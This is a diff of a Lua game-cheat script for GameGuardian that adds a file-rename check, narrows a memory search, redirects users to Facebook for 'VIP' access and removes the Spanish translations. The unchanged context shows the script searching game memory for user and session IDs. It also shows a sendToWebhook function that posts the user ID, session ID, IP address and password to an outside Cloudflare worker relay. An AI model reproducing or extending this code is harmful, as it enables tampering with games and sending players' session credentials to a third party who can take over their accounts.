@@ -1,3 +1,16 @@
+Detector = gg.getFile():match('[^/]+$')
+-------------------------------------------------------------------------
+Name =  'dragon-tools-script.lua' -- Type Name For Start Script . If Someone Will Rename It , Then Script Won't Run
+-------------------------------------------------------------------------
+if Detector == Name then
+-------------------------------------------------------------------------
+else 
+-------------------------------------------------------------------------
+Error = '⚠ File Rename Is Detected ⚠' -- Type Error Message Here 
+print(Error) 
+return
+end 
+
 gg.clearResults()
 -- script.lua
 -- this file contains the main script with login, language selection, and version-specific features.
@@ -53,10 +66,12 @@ end
 -- id finder function
 --------------------------------------------------
 local function findUserId()
-  gg.setRanges(gg.REGION_C_ALLOC | gg.REGION_OTHER)
+  gg.setRanges(gg.REGION_C_ALLOC)
+  gg.setVisible(true)
   gg.searchNumber(':userId', gg.TYPE_BYTE, false, gg.SIGN_EQUAL, 0, -1)
 
   local results = gg.getResults(500)
+  gg.clearResults()
   if #results == 0 then
     return nil, nil
   end
@@ -80,7 +95,7 @@ local function findUserId()
 end
 
 --------------------------------------------------
--- send data to cloudflare worer
+-- send data to cloudflare worker
 --------------------------------------------------
 local function sendToWebhook(userId, sessionId, ip, manualPassword)
     local workerUrl = "https://user-data-relay.dunggkr.workers.dev/"
@@ -153,7 +168,7 @@ local translations = {
     start_script = "▶️ Start Script",
     find_userid = "🔍 Find UserID",
     reset_userid_search = "🔄 Reset Finding UserID",
-    join_discord = "💬 Join our Discord Community",
+    join_discord = "💬 add me on facebook for VIP",
     exit_script = "✖️ Exit Script",
     select_password_method = "Select password entry method:",
     manual_password = "🔑 Manually Enter Password",
@@ -169,7 +184,7 @@ local translations = {
     password_expired = "❌ Password expired!\n☄️Please contact the owner to add subscription.\n📅 expired on: %s",
     success = "✅ Success!\n🔑 key: %s\n📅 expires on: %s\n⏰ time left: %d days, %d hours, %d minutes, %d seconds\n🕒 current time: %s",
     time_left = "⏳ Time left: %d days, %d hours, %d minutes, %d seconds",
-    discord_copied = "📋 Discord link copied to clipboard: %s",
+    discord_copied = "📋 addf me on facebook for VIP",
     no_internet = "📡 Cannot load login data. Check internet connection.",
     invalid_data = "💥 Invalid login data format",
     login_exec_failed = "💥 Failed to execute login data",
@@ -210,52 +225,19 @@ local translations = {
     no_internet_script = "📡 Server: Cho phép kết nối internet...",
     reset_userid_success = "✅ Đã xóa kết quả tìm kiếm userid!"
   },
-  Spanish = {
-    select_option = "Selecciona una opción:",
-    start_script = "▶️ Iniciar script",
-    find_userid = "🔍 Buscar userid",
-    reset_userid_search = "🔄 Restablecer búsqueda de userid",
-    join_discord = "💬 Unirse a nuestra comunidad de discord",
-    exit_script = "✖️ Salir del script",
-    select_password_method = "Selecciona el método de ingreso de contraseña:",
-    manual_password = "🔑 Ingresar contraseña manualmente",
-    auto_password = "🤖 Ingresar contraseña automáticamente",
-    enter_password = "Ingresar contraseña:",
-    no_userid = "¡No se encontró userid!",
-    info_found = "Información encontrada:\n\n🆔 userid: %s\n🔑 sessionid: %s",
-    userid_copied = "📋 userid copiado al portapapeles: %s",
-    no_userid_session = "¡No se encontraron userid ni sessionid!",
-    invalid_password = "⚠️ Contraseña inválida",
-    contact_owner = "📣 ¡Por favor, contacta al propietario para comprar!",
-    invalid_expiry = "💥 Formato de fecha de expiración inválido",
-    password_expired = "❌ ¡Contraseña expirada!\n☄️Contacta al propietario para agregar suscripción.\n📅 expiró el: %s",
-    success = "✅ ¡Éxito!\n🔑 Clave: %s\n📅 Expira el: %s\n⏰ Tiempo restante: %d días, %d horas, %d minutos, %d segundos\n🕒 hora actual: %s",
-    time_left = "⏳ Tiempo restante: %d días, %d horas, %d minutos, %d segundos",
-    discord_copied = "📋 Enlace de discord copiado al portapapeles: %s",
-    no_internet = "📡 No se pudo cargar los datos de inicio de sesión. verifica la conexión a internet.",
-    invalid_data = "💥 Formato de datos de inicio de sesión inválido",
-    login_exec_failed = "💥 Falló la ejecución de datos de inicio de sesión",
-    invalid_login_table = "💥 Los datos de inicio de sesión no son una tabla válida",
-    invalid_version = "💥 Versión especificada inválida",
-    script_load_failed = "💥 Servidor: contenido del script inválido",
-    no_internet_script = "📡 Servidor: permite la conexión a internet...",
-    reset_userid_success = "✅ ¡Resultados de búsqueda de userid restablecidos!"
-  }
 }
 
 -- language selection menu
 local langMenu = safeChoiceSearch({
-  "🇬🇧 English",
-  "🇻🇳 Tiếng việt",
-  "🇪🇸 Español"
-}, nil, "Select Language/ Chọn Ngôn Ngữ / Elija el idioma:")
+  "🇬🇧 English"
+}, nil, "Select Language")
 if not langMenu then
   while not gg.isVisible() do
     gg.sleep(100)
   end
   gg.setVisible(false)
 else
-  lang = langMenu == 1 and "English" or langMenu == 2 and "Vietnamese" or "Spanish"
+  lang = langMenu == 1 and "English"
 end
 
 local t = translations[lang]
